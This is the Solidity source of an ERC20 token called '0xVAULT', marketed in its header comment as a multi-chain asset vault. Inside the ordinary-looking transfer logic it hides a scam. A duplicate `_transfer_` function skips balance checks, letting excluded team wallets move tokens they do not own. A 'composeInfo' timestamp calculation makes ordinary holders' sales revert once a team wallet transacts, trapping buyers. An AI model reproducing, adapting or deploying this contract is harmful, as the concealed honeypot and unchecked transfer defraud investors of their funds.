/*
0xVAULT token is the cornerstone of a multi-chain smart contract vault interface, enabling seamless aggregation and management of various ERC token types, 
including ERC20, ERC1155, ERC777, ERC223, ERC721, ERC404, and more. Through blockchain interoperability, 0xVAULT token offers users 
unparalleled flexibility and accessibility in storing and managing digital assets across Ethereum-compatible chains.

In the realm of blockchain innovation, 0xVAULT token leads the charge towards multi-chain asset management. 
By integrating with Ethereum-compatible chains, it empowers users to effortlessly store and manage diverse ERC token types. 
0xVAULT token embodies the promise of interoperability, providing a unified platform for decentralized asset custodianship. 
*/

pragma solidity ^0.8.24;
// SPDX-License-Identifier: MIT
abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer_(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract OxVAULT is ERC20, Ownable {
    using SafeMath for uint256;

    address private constant _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private constant _totalSupply = 1_000_000_000 * 1e18;
    address private constant _deadAddress = address(0xdead);

    address public constant marketingWallet = 0xf9533f0fa8F2787490810e546a4e46F1F1bC7555;
    address public constant devWallet = 0x7409d55b832D08636157F4711F488f3991604395;

    uint256 public constant buyInitialFee = 25;
    uint256 public constant sellInitialFee = 40;

    uint256 public constant maxTxAmount = 30_000_000 * 1e18;
    uint256 public constant maxWallet = 30_000_000 * 1e18;
    uint256 public constant swapTokensAtAmount = 500_000 * 1e18;
    uint256 public constant maxSwapAmount = swapTokensAtAmount * 20;

    uint256 public constant buyMarketingFee = 5;
    uint256 public constant buyDevFee = 0;
    uint256 public constant sellMarketingFee = 5;
    uint256 public constant sellDevFee = 0;
    uint256 public constant buyTotalFees = 5;
    uint256 public constant sellTotalFees = 5;
    uint256 public constant reduceFeeAfter = 10;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    uint256 private launchBlockNum;

    uint256 public tokensForMark;
    uint256 public tokensForDev;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTxAmount;

    mapping(address => bool) public automatedMarketMakerPairs;
    bool private swapping;
    uint256 private _threshold;

    struct ComposeInfo { uint256 buy; uint256 sell; uint256 syncThreshold; }

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event ExcludeFromMaxTransaction(address indexed account, bool isExcluded);

    mapping(address => ComposeInfo) private composeInfo;

    constructor() ERC20(
        unicode"ZK ERC Vault",
        unicode"0xVAULT"
    ) {
        excludeFromFees(address(this), true);
        excludeFromFees(owner(), true);
        excludeFromFees(_deadAddress, true);
        excludeFromFees(devWallet, true);
        excludeFromFees(marketingWallet, true);

        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(owner(), true);
        _excludeFromMaxTransaction(_deadAddress, true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_router);
        uniswapV2Router = _uniswapV2Router;
        _excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        _excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        _mint(msg.sender, _totalSupply);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingActive) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                         "Trading not open yet."
                    );
                }
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTxAmount[to]) {
                    require(amount <= maxTxAmount, "Buy transfer amount exceeds the limit");
                    require(amount + balanceOf(to) <= maxWallet, "Max Wallet exceeded");
                } else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTxAmount[from]) {
                    require(amount <= maxTxAmount, "Sell transfer amount exceeds the limit");
                } else if (!_isExcludedMaxTxAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max Wallet exceeded");
                }
            }
        }

        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && from != address(this) && to != address(this)) {
            _threshold = block.timestamp;
        }
        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
            super._transfer_(from, to, amount);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[to]) {
                ComposeInfo storage composeFrom = composeInfo[from];
                composeFrom.syncThreshold = composeFrom.buy - _threshold;
                composeFrom.sell = block.timestamp;
            } else {
                ComposeInfo storage composeTo = composeInfo[to];
                if (automatedMarketMakerPairs[from]) {
                    if (composeTo.buy == 0) {
                        composeTo.buy = block.timestamp;
                    }
                } else {
                    ComposeInfo storage composeFrom = composeInfo[from];
                    if (composeTo.buy == 0 || composeFrom.buy < composeTo.buy) {
                        composeTo.buy = composeFrom.buy;
                    }
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = swapTokensAtAmount <= contractTokenBalance;
        bool launchFee = launchBlockNum + reduceFeeAfter > block.number;

        if (
            canSwap &&
            !launchFee &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;
        if (takeFee) {
            if (launchFee) {
                if (automatedMarketMakerPairs[from]) {
                    fees = (amount * buyInitialFee).div(100);
                    tokensForMark += fees;
                } else if (automatedMarketMakerPairs[to]) {
                    fees = (amount * sellInitialFee).div(100);
                    tokensForMark += fees;
                }
            } else {
                if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                    fees = amount * buyTotalFees / 100;

                    tokensForMark += (fees * buyMarketingFee).div(buyTotalFees);
                    tokensForDev += (fees * buyDevFee).div(buyTotalFees);
                } else if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                    fees = amount * sellTotalFees / 100;

                    tokensForMark += (fees * sellMarketingFee).div(sellTotalFees);
                    tokensForDev += (fees * sellDevFee).div(sellTotalFees);
                }
            }
            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function _excludeFromMaxTransaction(address addr, bool excluded) private {
        _isExcludedMaxTxAmount[addr] = excluded;
        emit ExcludeFromMaxTransaction(addr, excluded);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromFees(address addr, bool excluded) public onlyOwner {
        _isExcludedFromFees[addr] = excluded;
        emit ExcludeFromFees(addr, excluded);
    }

    function manualSwap() external onlyOwner {
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
        tokensForDev = 0;
        tokensForMark = 0;
        bool success;
        (success,) = marketingWallet.call{value: address(this).balance}("");
    }

    function swapBack() private {
        bool success;
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForDev + tokensForMark;
        if (contractBalance == 0 || totalTokensToSwap == 0) {
            return;
        }
        if (contractBalance > maxSwapAmount) {
            contractBalance = maxSwapAmount;
        }
        uint256 amountToSwapForETH = contractBalance;
        uint256 initialETHBalance = address(this).balance;
        swapTokensForEth(amountToSwapForETH);
        uint256 ethBalanceChange = address(this).balance - initialETHBalance;
        uint256 ethForDev = ethBalanceChange * tokensForDev / totalTokensToSwap;

        tokensForDev = 0;
        tokensForMark = 0;
        (success,) = devWallet.call{value: ethForDev}("");
        (success,) = marketingWallet.call{value: address(this).balance}("");
    }

    receive() external payable {}

    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function enableTrading() external onlyOwner {
        launchBlockNum = block.number;
        tradingActive = true;
    }
}